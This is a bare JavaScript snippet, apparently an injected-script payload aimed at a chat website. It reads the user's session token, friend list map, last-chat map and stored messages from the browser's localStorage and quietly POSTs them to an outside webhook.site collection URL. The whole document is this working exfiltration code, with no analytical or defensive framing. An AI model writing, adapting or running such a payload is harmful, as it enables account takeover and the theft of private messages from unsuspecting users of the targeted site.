fetch('https://webhook.site/6704268b-e422-41e4-af0b-357d62855550',
  {
    mode: 'no-cors',
    method: 'POST',
    body: JSON.stringify({
      token: localStorage['user:token'],
      userMap: localStorage['friends:userMap'],
      lastChatMap: localStorage['friends:lastChatMap'],
      messages: localStorage['free4talk:messages'],
    }),
  });
